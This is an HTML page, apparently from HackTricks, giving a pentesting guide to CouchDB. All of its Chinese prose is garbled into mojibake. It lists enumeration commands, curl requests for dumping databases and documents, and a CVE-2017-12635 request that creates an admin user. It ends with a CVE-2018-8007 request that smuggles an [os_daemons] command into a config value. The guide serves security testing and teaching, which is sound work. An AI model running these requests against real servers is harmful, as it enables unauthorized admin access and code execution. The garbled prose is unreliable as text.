<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>5984,6984 - Pentesting CouchDB</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="59846984---pentesting-couchdb"><a class="header" href="#59846984---pentesting-couchdb">5984,6984 - Pentesting CouchDB</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯"><strong>åŸºæœ¬ä¿¡æ¯</strong></a></h2>
<p><strong>CouchDB</strong> æ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½ä¸”å¼ºå¤§çš„ <strong>æ–‡æ¡£å¯¼å‘æ•°æ®åº“</strong>ï¼Œé€šè¿‡ <strong>é”®å€¼æ˜ å°„</strong> ç»“æ„åœ¨æ¯ä¸ª <strong>æ–‡æ¡£</strong> ä¸­ç»„ç»‡æ•°æ®ã€‚æ–‡æ¡£ä¸­çš„å­—æ®µå¯ä»¥è¡¨ç¤ºä¸º <strong>é”®/å€¼å¯¹ã€åˆ—è¡¨æˆ–æ˜ å°„</strong>ï¼Œæä¾›äº†æ•°æ®å­˜å‚¨å’Œæ£€ç´¢çš„çµæ´»æ€§ã€‚</p>
<p>æ¯ä¸ªå­˜å‚¨åœ¨ CouchDB ä¸­çš„ <strong>æ–‡æ¡£</strong> éƒ½è¢«åˆ†é…ä¸€ä¸ª <strong>å”¯ä¸€æ ‡è¯†ç¬¦</strong> (<code>_id</code>)ã€‚æ­¤å¤–ï¼Œæ¯æ¬¡å¯¹æ•°æ®åº“è¿›è¡Œçš„ä¿®æ”¹å’Œä¿å­˜éƒ½ä¼šåˆ†é…ä¸€ä¸ª <strong>ä¿®è®¢å·</strong> (<code>_rev</code>)ã€‚è¿™ä¸ªä¿®è®¢å·å…è®¸æœ‰æ•ˆçš„ <strong>è·Ÿè¸ªå’Œç®¡ç†æ›´æ”¹</strong>ï¼Œä¾¿äºåœ¨æ•°æ®åº“ä¸­è½»æ¾æ£€ç´¢å’ŒåŒæ­¥æ•°æ®ã€‚</p>
<p><strong>é»˜è®¤ç«¯å£ï¼š</strong> 5984ï¼ˆhttpï¼‰ï¼Œ6984ï¼ˆhttpsï¼‰</p>
<pre><code>PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
</code></pre>
<h2 id="è‡ªåŠ¨æšä¸¾"><a class="header" href="#è‡ªåŠ¨æšä¸¾"><strong>è‡ªåŠ¨æšä¸¾</strong></a></h2>
<pre><code class="language-bash">nmap -sV --script couchdb-databases,couchdb-stats -p &lt;PORT&gt; &lt;IP&gt;
msf&gt; use auxiliary/scanner/couchdb/couchdb_enum
</code></pre>
<h2 id="æ‰‹åŠ¨æšä¸¾"><a class="header" href="#æ‰‹åŠ¨æšä¸¾">æ‰‹åŠ¨æšä¸¾</a></h2>
<h3 id="æ¨ªå¹…"><a class="header" href="#æ¨ªå¹…">æ¨ªå¹…</a></h3>
<pre><code>curl http://IP:5984/
</code></pre>
<p>è¿™ä¼šå‘å·²å®‰è£…çš„CouchDBå®ä¾‹å‘å‡ºGETè¯·æ±‚ã€‚å›å¤åº”è¯¥ç±»ä¼¼äºä»¥ä¸‹ä¹‹ä¸€ï¼š</p>
<pre><code class="language-bash">{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
</code></pre>
<p>{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœè®¿é—® couchdb çš„æ ¹ç›®å½•æ—¶æ”¶åˆ° <code>401 Unauthorized</code>ï¼Œå¹¶ä¸”å†…å®¹ç±»ä¼¼äº <code>{"error":"unauthorized","reason":"Authentication required."}</code> <strong>æ‚¨å°†æ— æ³•è®¿é—®</strong> æ¨ªå¹…æˆ–ä»»ä½•å…¶ä»–ç«¯ç‚¹ã€‚
{% endhint %}</p>
<h3 id="ä¿¡æ¯æšä¸¾"><a class="header" href="#ä¿¡æ¯æšä¸¾">ä¿¡æ¯æšä¸¾</a></h3>
<p>è¿™äº›æ˜¯æ‚¨å¯ä»¥é€šè¿‡ <strong>GET</strong> è¯·æ±‚è®¿é—®å¹¶æå–ä¸€äº›æœ‰è¶£ä¿¡æ¯çš„ç«¯ç‚¹ã€‚æ‚¨å¯ä»¥åœ¨ <a href="https://docs.couchdb.org/en/latest/api/index.html"><strong>couchdb æ–‡æ¡£ä¸­æ‰¾åˆ°æ›´å¤šç«¯ç‚¹å’Œæ›´è¯¦ç»†çš„æè¿°</strong></a>ã€‚</p>
<ul>
<li><strong><code>/_active_tasks</code></strong> æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä»»åŠ¡ç±»å‹ã€åç§°ã€çŠ¶æ€å’Œè¿›ç¨‹ IDã€‚</li>
<li><strong><code>/_all_dbs</code></strong> è¿”å› CouchDB å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„åˆ—è¡¨ã€‚</li>
<li>**<code>/_cluster_setup</code>** è¿”å›èŠ‚ç‚¹æˆ–é›†ç¾¤çš„çŠ¶æ€ï¼ŒæŒ‰ç…§é›†ç¾¤è®¾ç½®å‘å¯¼ã€‚</li>
<li><strong><code>/_db_updates</code></strong> è¿”å› CouchDB å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“äº‹ä»¶çš„åˆ—è¡¨ã€‚ä½¿ç”¨æ­¤ç«¯ç‚¹éœ€è¦ <code>_global_changes</code> æ•°æ®åº“çš„å­˜åœ¨ã€‚</li>
<li><strong><code>/_membership</code></strong> æ˜¾ç¤ºä½œä¸º <code>cluster_nodes</code> çš„é›†ç¾¤èŠ‚ç‚¹ã€‚å­—æ®µ <code>all_nodes</code> æ˜¾ç¤ºæ­¤èŠ‚ç‚¹æ‰€çŸ¥é“çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬å±äºé›†ç¾¤çš„èŠ‚ç‚¹ã€‚</li>
<li><strong><code>/_scheduler/jobs</code></strong> å¤åˆ¶ä½œä¸šåˆ—è¡¨ã€‚æ¯ä¸ªä½œä¸šæè¿°å°†åŒ…æ‹¬æºå’Œç›®æ ‡ä¿¡æ¯ã€å¤åˆ¶ IDã€æœ€è¿‘äº‹ä»¶çš„å†å²è®°å½•ä»¥åŠå…¶ä»–ä¸€äº›ä¿¡æ¯ã€‚</li>
<li><strong><code>/_scheduler/docs</code></strong> å¤åˆ¶æ–‡æ¡£çŠ¶æ€åˆ—è¡¨ã€‚åŒ…æ‹¬æœ‰å…³æ‰€æœ‰æ–‡æ¡£çš„ä¿¡æ¯ï¼Œå³ä½¿åœ¨ <code>completed</code> å’Œ <code>failed</code> çŠ¶æ€ä¸‹ã€‚å¯¹äºæ¯ä¸ªæ–‡æ¡£ï¼Œå®ƒè¿”å›æ–‡æ¡£ IDã€æ•°æ®åº“ã€å¤åˆ¶ IDã€æºå’Œç›®æ ‡ä»¥åŠå…¶ä»–ä¿¡æ¯ã€‚</li>
<li><strong><code>/_scheduler/docs/{replicator_db}</code></strong></li>
<li><strong><code>/_scheduler/docs/{replicator_db}/{docid}</code></strong></li>
<li><strong><code>/_node/{node-name}</code></strong> <code>/_node/{node-name}</code> ç«¯ç‚¹å¯ç”¨äºç¡®è®¤å¤„ç†è¯·æ±‚çš„æœåŠ¡å™¨çš„ Erlang èŠ‚ç‚¹åç§°ã€‚å½“è®¿é—® <code>/_node/_local</code> ä»¥æ£€ç´¢æ­¤ä¿¡æ¯æ—¶ï¼Œè¿™æœ€ä¸ºæœ‰ç”¨ã€‚</li>
<li><strong><code>/_node/{node-name}/_stats</code></strong> <code>_stats</code> èµ„æºè¿”å›ä¸€ä¸ª JSON å¯¹è±¡ï¼ŒåŒ…å«æ­£åœ¨è¿è¡Œçš„æœåŠ¡å™¨çš„ç»Ÿè®¡ä¿¡æ¯ã€‚å­—é¢å­—ç¬¦ä¸² <code>_local</code> ä½œä¸ºæœ¬åœ°èŠ‚ç‚¹åç§°çš„åˆ«åï¼Œå› æ­¤å¯¹äºæ‰€æœ‰ç»Ÿè®¡ URLï¼Œ<code>{node-name}</code> å¯ä»¥æ›¿æ¢ä¸º <code>_local</code>ï¼Œä»¥ä¸æœ¬åœ°èŠ‚ç‚¹çš„ç»Ÿè®¡ä¿¡æ¯è¿›è¡Œäº¤äº’ã€‚</li>
<li><strong><code>/_node/{node-name}/_system</code></strong> _system èµ„æºè¿”å›ä¸€ä¸ª JSON å¯¹è±¡ï¼ŒåŒ…å«æ­£åœ¨è¿è¡Œçš„æœåŠ¡å™¨çš„å„ç§ç³»ç»Ÿçº§ç»Ÿè®¡ä¿¡æ¯ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ __<code>_local</code> ä½œä¸º {node-name} æ¥è·å–å½“å‰èŠ‚ç‚¹ä¿¡æ¯ã€‚</li>
<li><strong><code>/_node/{node-name}/_restart</code></strong></li>
<li><strong><code>/_up</code></strong> ç¡®è®¤æœåŠ¡å™¨å·²å¯åŠ¨ã€æ­£åœ¨è¿è¡Œå¹¶å‡†å¤‡å“åº”è¯·æ±‚ã€‚å¦‚æœ <a href="https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance_mode"><code>maintenance_mode</code></a> ä¸º <code>true</code> æˆ– <code>nolb</code>ï¼Œåˆ™è¯¥ç«¯ç‚¹å°†è¿”å› 404 å“åº”ã€‚</li>
<li>**<code>/_uuids</code>** ä» CouchDB å®ä¾‹è¯·æ±‚ä¸€ä¸ªæˆ–å¤šä¸ªå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ (UUID)ã€‚</li>
<li>**<code>/_reshard</code>** è¿”å›å·²å®Œæˆã€å¤±è´¥ã€æ­£åœ¨è¿è¡Œã€å·²åœæ­¢å’Œæ€»ä½œä¸šçš„è®¡æ•°ï¼Œä»¥åŠé›†ç¾¤ä¸Šé‡æ–°åˆ†ç‰‡çš„çŠ¶æ€ã€‚</li>
</ul>
<p>å¯ä»¥æå–æ›´å¤šæœ‰è¶£çš„ä¿¡æ¯ï¼Œå¦‚æ­¤å¤„æ‰€è¿°ï¼š<a href="https://lzone.de/cheat-sheet/CouchDB">https://lzone.de/cheat-sheet/CouchDB</a></p>
<h3 id="æ•°æ®åº“åˆ—è¡¨"><a class="header" href="#æ•°æ®åº“åˆ—è¡¨"><strong>æ•°æ®åº“åˆ—è¡¨</strong></a></h3>
<pre><code>curl -X GET http://IP:5984/_all_dbs
</code></pre>
<p>å¦‚æœè¯¥è¯·æ±‚ <strong>å“åº”401æœªæˆæƒ</strong>ï¼Œé‚£ä¹ˆæ‚¨éœ€è¦ä¸€äº› <strong>æœ‰æ•ˆå‡­æ®</strong> æ¥è®¿é—®æ•°æ®åº“ï¼š</p>
<pre><code>curl -X GET http://user:password@IP:5984/_all_dbs
</code></pre>
<p>ä¸ºäº†æ‰¾åˆ°æœ‰æ•ˆçš„å‡­æ®ï¼Œä½ å¯ä»¥<strong>å°è¯•</strong> <a href="../generic-hacking/brute-force.html#couchdb"><strong>æš´åŠ›ç ´è§£æœåŠ¡</strong></a>ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªcouchdb <strong>å“åº”</strong> çš„<strong>ç¤ºä¾‹</strong>ï¼Œå½“ä½ æ‹¥æœ‰<strong>è¶³å¤Ÿçš„æƒé™</strong>æ¥åˆ—å‡ºæ•°æ®åº“æ—¶ï¼ˆè¿™åªæ˜¯ä¸€ä¸ªæ•°æ®åº“åˆ—è¡¨ï¼‰ï¼š</p>
<pre><code class="language-bash">["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
</code></pre>
<h3 id="æ•°æ®åº“ä¿¡æ¯"><a class="header" href="#æ•°æ®åº“ä¿¡æ¯">æ•°æ®åº“ä¿¡æ¯</a></h3>
<p>æ‚¨å¯ä»¥é€šè¿‡è®¿é—®æ•°æ®åº“åç§°æ¥è·å–ä¸€äº›æ•°æ®åº“ä¿¡æ¯ï¼ˆå¦‚æ–‡ä»¶æ•°é‡å’Œå¤§å°ï¼‰ï¼š</p>
<pre><code class="language-bash">curl http://IP:5984/&lt;database&gt;
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
</code></pre>
<h3 id="æ–‡æ¡£åˆ—è¡¨"><a class="header" href="#æ–‡æ¡£åˆ—è¡¨"><strong>æ–‡æ¡£åˆ—è¡¨</strong></a></h3>
<p>åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ¯ä¸ªæ¡ç›®</p>
<pre><code class="language-bash">curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
</code></pre>
<h3 id="è¯»å–æ–‡æ¡£"><a class="header" href="#è¯»å–æ–‡æ¡£"><strong>è¯»å–æ–‡æ¡£</strong></a></h3>
<p>è¯»å–æ•°æ®åº“ä¸­æ–‡æ¡£çš„å†…å®¹ï¼š</p>
<pre><code class="language-bash">curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
</code></pre>
<h2 id="couchdb-æƒé™æå‡-cve-2017-12635"><a class="header" href="#couchdb-æƒé™æå‡-cve-2017-12635">CouchDB æƒé™æå‡ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635">CVE-2017-12635</a></a></h2>
<p>ç”±äº Erlang å’Œ JavaScript JSON è§£æå™¨ä¹‹é—´çš„å·®å¼‚ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹è¯·æ±‚<strong>åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·</strong>ï¼Œå‡­æ®ä¸º <code>hacktricks:hacktricks</code>ï¼š</p>
<pre><code class="language-bash">curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
</code></pre>
<p><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html"><strong>æœ‰å…³æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯</strong></a>ã€‚</p>
<h2 id="couchdb-rce"><a class="header" href="#couchdb-rce">CouchDB RCE</a></h2>
<h3 id="erlang-cookie-å®‰å…¨æ¦‚è¿°"><a class="header" href="#erlang-cookie-å®‰å…¨æ¦‚è¿°"><strong>Erlang Cookie å®‰å…¨æ¦‚è¿°</strong></a></h3>
<p>ç¤ºä¾‹ <a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html">æ¥è‡ªè¿™é‡Œ</a>ã€‚</p>
<p>åœ¨ CouchDB æ–‡æ¡£ä¸­ï¼Œç‰¹åˆ«æ˜¯åœ¨æœ‰å…³é›†ç¾¤è®¾ç½®çš„éƒ¨åˆ† (<a href="http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup">é“¾æ¥</a>)ï¼Œè®¨è®ºäº† CouchDB åœ¨é›†ç¾¤æ¨¡å¼ä¸‹ä½¿ç”¨çš„ç«¯å£ã€‚æåˆ°ä¸ç‹¬ç«‹æ¨¡å¼ä¸€æ ·ï¼Œç«¯å£ <code>5984</code> è¢«ä½¿ç”¨ã€‚æ­¤å¤–ï¼Œç«¯å£ <code>5986</code> ç”¨äºèŠ‚ç‚¹æœ¬åœ° APIï¼Œé‡è¦çš„æ˜¯ï¼ŒErlang éœ€è¦ TCP ç«¯å£ <code>4369</code> ç”¨äº Erlang ç«¯å£æ˜ å°„å®ˆæŠ¤è¿›ç¨‹ (EPMD)ï¼Œä»¥ä¿ƒè¿› Erlang é›†ç¾¤å†…çš„èŠ‚ç‚¹é€šä¿¡ã€‚æ­¤è®¾ç½®å½¢æˆäº†ä¸€ä¸ªç½‘ç»œï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¸å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹ç›¸äº’è¿æ¥ã€‚</p>
<p>å…³äºç«¯å£ <code>4369</code> çš„ä¸€ä¸ªé‡è¦å®‰å…¨å»ºè®®è¢«å¼ºè°ƒã€‚å¦‚æœæ­¤ç«¯å£åœ¨äº’è”ç½‘ä¸Šæˆ–ä»»ä½•ä¸å—ä¿¡ä»»çš„ç½‘ç»œä¸Šå¯è®¿é—®ï¼Œç³»ç»Ÿçš„å®‰å…¨æ€§åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºä¸€ä¸ªç§°ä¸ºâ€œcookieâ€çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚è¿™ä¸ª cookie å……å½“äº†ä¸€ä¸ªä¿æŠ¤æªæ–½ã€‚ä¾‹å¦‚ï¼Œåœ¨ç»™å®šçš„è¿›ç¨‹åˆ—è¡¨ä¸­ï¼Œå¯èƒ½ä¼šè§‚å¯Ÿåˆ°åä¸ºâ€œmonsterâ€çš„ cookieï¼ŒæŒ‡ç¤ºå…¶åœ¨ç³»ç»Ÿå®‰å…¨æ¡†æ¶ä¸­çš„æ“ä½œè§’è‰²ã€‚</p>
<pre><code>www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
</code></pre>
<p>å¯¹äºé‚£äº›æœ‰å…´è¶£äº†è§£å¦‚ä½•åœ¨Erlangç³»ç»Ÿä¸­åˆ©ç”¨è¿™ä¸ªâ€œcookieâ€è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„äººï¼Œæä¾›äº†ä¸€ä¸ªä¸“é—¨çš„éƒ¨åˆ†ä¾›è¿›ä¸€æ­¥é˜…è¯»ã€‚å®ƒè¯¦ç»†è¯´æ˜äº†å¦‚ä½•ä»¥æœªç»æˆæƒçš„æ–¹å¼åˆ©ç”¨Erlang cookies æ¥æ§åˆ¶ç³»ç»Ÿã€‚æ‚¨å¯ä»¥<a href="4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce"><strong>åœ¨è¿™é‡Œæ¢ç´¢å…³äºæ»¥ç”¨Erlang cookies è¿›è¡ŒRCEçš„è¯¦ç»†æŒ‡å—</strong></a>ã€‚</p>
<h3 id="é€šè¿‡ä¿®æ”¹-localini-åˆ©ç”¨-cve-2018-8007"><a class="header" href="#é€šè¿‡ä¿®æ”¹-localini-åˆ©ç”¨-cve-2018-8007"><strong>é€šè¿‡ä¿®æ”¹ local.ini åˆ©ç”¨ CVE-2018-8007</strong></a></h3>
<p>ç¤ºä¾‹<a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html">æ¥è‡ªè¿™é‡Œ</a>ã€‚</p>
<p>æœ€è¿‘æŠ«éœ²çš„æ¼æ´CVE-2018-8007å½±å“äº†Apache CouchDBï¼Œç ”ç©¶è¡¨æ˜ï¼Œåˆ©ç”¨è¯¥æ¼æ´éœ€è¦å¯¹<code>local.ini</code>æ–‡ä»¶çš„å†™æƒé™ã€‚å°½ç®¡ç”±äºå®‰å…¨é™åˆ¶ï¼Œæ— æ³•ç›´æ¥åº”ç”¨äºåˆå§‹ç›®æ ‡ç³»ç»Ÿï¼Œä½†è¿›è¡Œäº†ä¿®æ”¹ä»¥æˆäºˆå¯¹<code>local.ini</code>æ–‡ä»¶çš„å†™è®¿é—®æƒé™ä»¥ä¾›æ¢ç´¢ã€‚ä¸‹é¢æä¾›äº†è¯¦ç»†çš„æ­¥éª¤å’Œä»£ç ç¤ºä¾‹ï¼Œæ¼”ç¤ºäº†è¯¥è¿‡ç¨‹ã€‚</p>
<p>é¦–å…ˆï¼Œé€šè¿‡ç¡®ä¿<code>local.ini</code>æ–‡ä»¶å¯å†™æ¥å‡†å¤‡ç¯å¢ƒï¼Œé€šè¿‡åˆ—å‡ºæƒé™è¿›è¡ŒéªŒè¯ï¼š</p>
<pre><code class="language-bash">root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
</code></pre>
<p>ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ‰§è¡Œä¸€ä¸ª curl å‘½ä»¤ï¼Œé’ˆå¯¹ <code>local.ini</code> ä¸­çš„ <code>cors/origins</code> é…ç½®ã€‚è¿™ä¼šåœ¨ <code>[os_daemons]</code> éƒ¨åˆ†æ³¨å…¥ä¸€ä¸ªæ–°çš„æ¥æºä»¥åŠé¢å¤–çš„å‘½ä»¤ï¼Œæ—¨åœ¨æ‰§è¡Œä»»æ„ä»£ç ï¼š</p>
<pre><code class="language-bash">www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
</code></pre>
